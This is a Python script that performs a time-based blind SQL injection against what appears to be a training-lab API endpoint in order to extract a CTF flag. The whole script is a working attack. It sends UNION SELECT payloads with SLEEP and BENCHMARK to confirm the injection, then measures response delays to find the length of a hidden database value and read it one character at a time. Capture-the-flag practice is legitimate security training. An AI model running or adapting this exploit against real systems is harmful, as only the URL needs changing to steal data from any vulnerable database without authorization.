#!/usr/bin/env python3
import requests
import string
import time

url = "http://web0x01.hbtn/api/a3/sql_injection/all_orders"
chars = string.digits + string.ascii_lowercase  # 0-9 a-f plus others if needed

# 1. SLEEP test
print("[*] Testing SLEEP injection...")
payload_test = "no' UNION SELECT SLEEP(4),NULL,NULL,NULL,NULL;--"
start = time.time()
try:
    r = requests.get(url, params={"status": payload_test}, timeout=15)
except requests.exceptions.ReadTimeout:
    pass
elapsed = time.time() - start
print(f"[*] SLEEP(4) response time: {elapsed:.2f}s")
if elapsed < 3:
    print("[!] SLEEP may not be working. Try BENCHMARK instead.")
    payload_test2 = "no' UNION SELECT BENCHMARK(50000000,MD5('x')),NULL,NULL,NULL,NULL;--"
    start = time.time()
    try:
        r = requests.get(url, params={"status": payload_test2}, timeout=30)
    except:
        pass
    elapsed2 = time.time() - start
    print(f"[*] BENCHMARK response time: {elapsed2:.2f}s")

# 2. Value uzunluğunu tap (LIMIT 1 istifadə et!)
print("\n[*] Finding value length (first row)...")
for length in range(1, 65):
    payload = f"no' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM not_me WHERE LENGTH(value)={length} AND SLEEP(4) LIMIT 1;--"
    start = time.time()
    try:
        r = requests.get(url, params={"status": payload}, timeout=15)
    except:
        pass
    elapsed = time.time() - start
    if elapsed > 3:
        print(f"[+] Value length = {length}")
        break

# 3. Extract flag character by character
flag = ""
print(f"\n[*] Extracting flag...")
for i in range(1, length + 1):
    found = False
    for c in chars:
        # Use LIMIT 1 to avoid multiple rows triggering SLEEP multiple times
        payload = f"no' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM not_me WHERE SUBSTRING(value,{i},1)='{c}' AND SLEEP(4) LIMIT 1;--"
        start = time.time()
        try:
            r = requests.get(url, params={"status": payload}, timeout=15)
        except:
            pass
        elapsed = time.time() - start
        
        if elapsed > 3:
            flag += c
            print(f"[+] Pos {i}: '{c}' -> Flag: {flag}")
            found = True
            break
    
    if not found:
        # Try uppercase
        for c in string.ascii_uppercase:
            payload = f"no' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM not_me WHERE SUBSTRING(value,{i},1)='{c}' AND SLEEP(4) LIMIT 1;--"
            start = time.time()
            try:
                r = requests.get(url, params={"status": payload}, timeout=15)
            except:
                pass
            elapsed = time.time() - start
            if elapsed > 3:
                flag += c
                print(f"[+] Pos {i}: '{c}' -> Flag: {flag}")
                found = True
                break
    
    if not found:
        print(f"[-] Could not find char at position {i}")
        # Print what we have so far
        print(f"[*] Flag so far: {flag}")
        break

print(f"\n[✅] FINAL FLAG: {flag}")
